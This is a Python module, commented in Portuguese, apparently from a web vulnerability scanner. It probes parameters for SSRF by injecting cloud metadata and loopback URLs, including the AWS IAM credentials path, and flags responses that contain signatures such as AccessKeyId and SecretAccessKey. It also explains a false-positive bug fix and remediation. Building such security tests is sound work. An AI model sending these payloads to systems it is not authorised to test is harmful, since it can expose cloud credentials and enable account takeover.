"""
modules/internal_ip_ssrf_prober.py

Manda IP interno/endpoint de metadado de cloud CONHECIDO como valor de
parametro, e procura assinatura de conteudo real de metadado na
resposta -- diferente de callback_ssrf_heuristic.py (que confirma via
canal externo, funciona pra SSRF cego), este modulo depende da resposta
EXPOR o conteudo buscado, então só confirma SSRF "não-cego".

LIMITACAO HONESTA: o endpoint 169.254.169.254 só responde de verdade
dentro de uma VM na nuvem (AWS/GCP/Azure/etc.) -- não dá pra validar
isso contra alvo fora desse ambiente. A lógica de DETECÇÃO (reconhecer
assinatura de resposta de metadado real) é testável e testada aqui; a
parte "o alvo realmente está numa cloud e vai responder" não é algo que
o TRACE consegue simular fora do ambiente de nuvem de verdade.
"""

from __future__ import annotations

from utils.requester import get, post
from knowledge.contracts import discovery_module, Requirement, Produces
from knowledge.result import ModuleResult

_INTERNAL_TARGETS = [
    ("http://169.254.169.254/latest/meta-data/", "AWS metadata v1"),
    ("http://169.254.169.254/latest/meta-data/iam/security-credentials/", "AWS metadata (IAM credentials)"),
    ("http://169.254.169.254/computeMetadata/v1/", "GCP metadata"),
    ("http://localhost/", "localhost (bypass de filtro por hostname)"),
    ("http://127.0.0.1/", "loopback direto"),
]

# presença de qualquer um destes na resposta é forte indício de
# conteúdo de metadado de cloud REAL (não coincidência de página normal)
#
# BUG REAL encontrado (09/2026): "iam/security-credentials" e
# "computemetadata" eram assinaturas de detecção, mas são literalmente
# SUBSTRING das próprias URLs de payload em _INTERNAL_TARGETS acima
# (".../meta-data/iam/security-credentials/" e ".../computeMetadata/v1/").
# Um alvo que NUNCA busca nada -- só ecoa a URL recebida numa mensagem
# de erro ("Erro: não foi possível buscar <url>", comportamento comum
# de qualquer app) -- disparava falso positivo CRÍTICO, porque a
# assinatura batia no PRÓPRIO PAYLOAD ecoado, não em conteúdo de
# resposta de metadado de verdade. Substituído por campo que só existe
# no CONTEÚDO retornado por um metadado real (AccessKeyId/
# SecretAccessKey da credencial IAM, numeric-project-id do GCP) --
# nunca aparece na URL que a gente mesma manda.
_METADATA_SIGNATURES = (
    "ami-id", "instance-id", "accesskeyid", "secretaccesskey",
    "placement/availability-zone", "local-ipv4", "numeric-project-id",
    "instance/service-accounts",
)

assert not any(sig in url.lower() for sig in _METADATA_SIGNATURES for url, _ in _INTERNAL_TARGETS), (
    "uma assinatura de detecção colide com substring de uma URL de payload -- "
    "isso causa falso positivo em qualquer alvo que apenas ecoe a URL recebida "
    "(ver bug real corrigido em 09/2026). Escolha uma assinatura que só apareça "
    "em CONTEÚDO de resposta real, nunca na URL do próprio payload."
)


def indicates_metadata_leak(baseline_text: str, test_text: str) -> bool:
    """Mesma lógica de comparação contra baseline dos outros heurísticos
    -- só conta se a assinatura aparece no TESTE e não aparecia no
    baseline (evita falso positivo em página que já menciona esses
    termos por acaso, ex.: documentação técnica sobre AWS)."""
    baseline_lower = (baseline_text or "").lower()
    test_lower = (test_text or "").lower()
    return any(sig in test_lower and sig not in baseline_lower for sig in _METADATA_SIGNATURES)


def _send(url: str, method: str, params: dict):
    if method.upper() == "GET":
        return get(url, params=params)
    return post(url, data=params)


def _hash_from_key(key) -> str:
    return str(key).split(".")[-1]


@discovery_module(
    requires=[Requirement("surface.param.*", min_confidence=0.5)],
    produces=[],
    cost=len(_INTERNAL_TARGETS),
    max_reentries=20,
    category="ssrf_generic",
    display_name="Sondagem de SSRF contra IP Interno/Metadado de Cloud",
    summary="Envia IP interno/endpoint de metadado de cloud conhecido como valor de parâmetro e procura assinatura de conteúdo de metadado real na resposta.",
)
class InternalIPSSRFProber:
    name = "internal_ip_ssrf_prober"
    _tested: set[tuple] = set()

    def run(self, target, facts_in):
        params = facts_in.get("surface.param.*", [])
        findings = []

        for f in params:
            info = f.value
            url, method, param = info["url"], info["method"], info["param"]
            hash_id = _hash_from_key(f.key)
            if (target, hash_id) in self._tested:
                continue
            self._tested.add((target, hash_id))

            baseline_resp = _send(url, method, {param: "http://surfacer-baseline-nao-existe.invalid/"})
            baseline_text = baseline_resp.text if baseline_resp is not None else ""

            for internal_url, description in _INTERNAL_TARGETS:
                resp = _send(url, method, {param: internal_url})
                if resp is None:
                    continue

                if indicates_metadata_leak(baseline_text, resp.text):
                    findings.append({
                        "title": f"SSRF contra recurso interno confirmado: parâmetro '{param}' em {url}",
                        "severity": "critical",
                        "module": self.name,
                        "category": "ssrf",
                        "endpoint": url,
                        "description": (
                            f"O parâmetro '{param}' (via {method}), recebendo '{internal_url}' "
                            f"({description}), expôs conteúdo com assinatura de metadado real na resposta."
                        ),
                        "business_impact": (
                            "Acesso a endpoint de metadado de cloud pode expor credencial IAM "
                            "temporária com privilégio da instância -- geralmente escalação "
                            "direta pra controle da conta de nuvem inteira."
                        ),
                        "remediation": "Bloquear requisição de saída pra faixa de IP link-local (169.254.0.0/16) e loopback no nível de rede, além de validar destino na aplicação.",
                        "evidence": {"url": url, "method": method, "param": param, "internal_target": internal_url},
                    })
                    break  # um confirmado já basta pra esse parâmetro

        if not findings:
            return None
        return ModuleResult(findings=findings)
